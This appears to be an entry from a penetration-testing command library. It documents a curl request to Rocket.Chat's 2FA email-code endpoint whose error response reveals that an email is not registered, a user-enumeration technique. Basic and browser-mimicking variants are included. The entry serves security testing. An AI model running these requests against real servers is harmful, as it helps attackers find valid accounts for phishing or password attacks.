---
data: >-
  curl -X POST http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode -H
  "Content-Type: application/json" -d '{"emailOrUsername":"test2@test.test"}'
tags:
  - information-disclosure
  - email-enumeration
type: command
output: >-
  {"success":false,"error":"Invalid user
  [error-invalid-user]","errorType":"error-invalid-user"}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:19.138Z'
id: 2f8900ca-3386-4e0f-94a9-a55f86b154fe
verified: false
validated: true
submitted: true
---
# curl-rocket-chat-invalid-email-enumeration

## Command

```bash
curl -X POST http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -d '{"emailOrUsername":"test2@test.test"}'
```

## Description

This command sends a POST request to the Rocket.Chat 2FA endpoint with an invalid email address in the emailOrUsername parameter, eliciting an error response that distinguishes it from valid users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `http://rocket-chat.local:3000/api/v1/users.2fa.sendEmailCode` | Target endpoint URL (replace with actual host) | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type header | Yes |
| `-d '{"emailOrUsername":"test2@test.test"}'` | JSON payload with non-existent email to test | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://target:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -d '{"emailOrUsername":"fake@example.com"}'
```

### Advanced Usage

Include referer header to mimic browser:

```bash
curl -X POST http://target:3000/api/v1/users.2fa.sendEmailCode -H "Content-Type: application/json" -H "Referer: http://target/home" -d '{"emailOrUsername":"fake@example.com"}'
```

## Expected Output

HTTP/1.1 400 Bad Request followed by {"success":false,"error":"Invalid user [error-invalid-user]","errorType":"error-invalid-user"}, confirming the email is not registered.

## Related

- [[commands/curl-rocket-chat-valid-email-enumeration]]
- [[procedures/Email-Enumeration-via-Rocket-Chat-2FA-Endpoint]]
